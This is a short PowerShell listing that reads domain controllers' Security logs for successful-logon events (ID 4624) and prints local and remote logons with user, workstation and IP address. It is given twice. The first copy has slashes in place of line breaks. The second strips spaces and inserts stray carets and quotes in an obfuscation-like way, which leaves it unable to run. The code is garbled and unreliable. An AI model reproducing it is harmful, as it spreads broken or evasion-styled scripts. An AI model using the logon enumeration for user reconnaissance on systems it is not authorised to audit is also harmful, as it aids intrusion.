Command:
$DCs = Get-ADDomainController -Filter /$startDate = (get-date).AddDays(-1)/foreach ($DC in $DCs){
$slogonevents = Get-Eventlog -LogName
Security -ComputerName $DC.Hostname -
after $startDate | where {$_.eventID -eq
4624 }}/foreach ($e in $slogonevents){
# Logon Successful Events
# Local (Logon Type 2)
if (($e.EventID -eq 4624 ) -and
($e.ReplacementStrings[8] -eq 2)){
write-host "Type: Local Logon`tDate:
"$e.TimeGenerated "`tStatus:
Success`tUser: "$e.ReplacementStrings[5]
"`tWorkstation: "$e.ReplacementStrings[11]
}/if (($e.EventID -eq 4624 ) -and
($e.ReplacementStrings[8] -eq 10)){
write-host "Type: Remote Logon`tDate:
"$e.TimeGenerated "`tStatus:
Success`tUser: "$e.ReplacementStrings[5]
"`tWorkstation: "$e.ReplacementStrings[11]
"`tIP Address: "$e.ReplacementStrings[18]
}}

$DCs=Get-ADDomainController-Filter/$startDate=(get-date).AddDays(-1)/foreach($DCin$DCs){
$slogonevents=Get-Eventlog-LogName
Security-ComputerName$DC.Hostname-
after$startDate"^^|"where{$_.eventID-eq
4624}}/foreach($ein$slogonevents){
#LogonSuccessfulEvents
#Local(LogonType2)
if(($e.EventID-eq4624)-and
($e.ReplacementStrings[8]-eq2)){
write-host"Type:"Local"Logon`tDate:
"$e.TimeGenerated"`tStatus:
Success`tUser:"$e.ReplacementStrings[5]
"`tWorkstation:"$e.ReplacementStrings[11]
}/if(($e.EventID"-eq"4624)-and
($e.ReplacementStrings[8]-eq10)){
write-host"Type:RemoteLogon`tDate:
"$e.TimeGenerated"`tStatus:
Success`tUser:"$e.ReplacementStrings[5]
"`tWorkstation:	"$e.ReplacementStrings[11]
"`tIPAddress:"$e.ReplacementStrings[18]
}}
